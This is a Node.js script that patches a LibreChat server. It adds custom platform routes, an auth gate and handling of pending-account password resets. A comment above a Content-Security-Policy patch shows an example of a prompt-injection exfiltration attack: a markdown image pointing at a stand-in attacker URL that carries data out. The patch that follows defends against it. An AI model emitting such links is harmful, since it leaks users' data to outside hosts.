import fs from "node:fs";
function patch(file, before, after) {
  const source = fs.readFileSync(file, "utf8");
  if (source.split(before).length !== 2)
    throw new Error(`Unexpected native account seam: ${file}`);
  fs.writeFileSync(file, source.replace(before, after));
}
patch(
  "/app/api/server/routes/admin/users.js",
  "module.exports = router;",
  "require('/app/kai-platform/routes.cjs').installAdmin(router);\nmodule.exports = router;",
);
patch(
  "/app/api/server/index.js",
  "  app.use('/api/auth', preAuthTenantMiddleware, routes.auth);",
  "  app.use('/api/internal/warehouse-user', require('/app/kai-platform/routes.cjs').internalWarehouseRouter);\n  app.use('/activate-account', require('/app/kai-platform/routes.cjs').activationRouter);\n  app.use('/api/kai-jobs', require('/app/kai-platform/routes.cjs').jobsRouter);\n  app.use('/api/auth', preAuthTenantMiddleware, routes.auth);",
);
// Prompt-injection exfiltration guard: a model tricked into writing ![](https://attacker/?d=<data>) would make the
// browser send data out on render. Browsers enforce every CSP header, so this extra img-src policy holds alongside
// LibreChat's own CSP (whose img-src allows any https: host and can only be widened by env).
patch(
  "/app/api/server/index.js",
  "  app.disable('x-powered-by');",
  "  app.disable('x-powered-by');\n  app.use((req, res, next) => { res.append('Content-Security-Policy', \"img-src 'self' data: blob:\"); next(); });",
);
patch(
  "/app/api/server/middleware/requireJwtAuth.js",
  "      tenantContextMiddleware(req, res, (tenantErr) => {",
  "      require('/app/kai-platform/runtime.cjs').gate(req, res, () => {\n      tenantContextMiddleware(req, res, (tenantErr) => {",
);
patch(
  "/app/api/server/middleware/requireJwtAuth.js",
  "        refreshCloudFrontCookies(req, res, next);\n      });",
  "        refreshCloudFrontCookies(req, res, next);\n      });\n      }).catch(next);",
);

// Pending invitations use their own capability, including when native password reset is enabled later.
patch(
  "/app/api/server/services/AuthService.js",
  "  const user = await findUser({ email }, 'email _id role tenantId');",
  "  const user = await findUser({ email }, 'email _id role tenantId');\n  if (user && await require('/app/kai-platform/runtime.cjs').isPending(String(user._id))) return { message: 'If an account with that email exists, a password reset link has been sent to it.' };",
);
patch(
  "/app/api/server/services/AuthService.js",
  "const resetPassword = async (userId, token, password) => {",
  "const resetPassword = async (userId, token, password) => {\n  if (await require('/app/kai-platform/runtime.cjs').isPending(String(userId))) return new Error('Account activation required');",
);

await (await import("./install_managed_agents.mjs")).installManagedAgents();
await (await import('./install_account_security.mjs')).installAccountSecurity();
await (await import('./install_binding_acl.mjs')).installBindingACL();
await (await import('./install_agent_duplication.mjs')).installAgentDuplication();
